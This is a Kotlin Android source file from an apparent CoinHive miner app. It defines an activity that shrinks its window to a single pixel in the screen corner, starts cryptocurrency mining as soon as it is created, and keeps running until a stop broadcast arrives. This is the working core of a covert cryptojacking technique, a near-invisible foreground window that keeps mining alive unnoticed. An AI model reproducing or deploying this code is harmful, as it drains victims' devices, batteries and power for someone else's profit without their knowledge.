package com.cbstudio.coinhiveminer

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Bundle
import android.util.Log
import android.view.Gravity
import com.theah64.coinhive.BaseCoinHiveActivity

class OnePxActivity : BaseCoinHiveActivity() {

    companion object {
        var instance: OnePxActivity? = null
    }

    val receiver = this.BroadCastReceiver()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_one_px)

        window.setGravity(Gravity.START or Gravity.TOP)
        val layoutParameter = window.attributes
        layoutParameter.width = 1
        layoutParameter.height = 1

        layoutParameter.x = 0
        layoutParameter.y = 0

        window.attributes = layoutParameter
        instance = this

        startMining()
        registerReceiver(receiver, IntentFilter(ACTION_STOP_MINING))
        Log.d("DEBUG", "1px ok")
    }

    override fun onDestroy() {
        super.onDestroy()
        instance = null
    }

    inner class BroadCastReceiver : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            when (intent?.action) {
                ACTION_STOP_MINING -> {
                    finish()
                }
            }
        }
    }
}
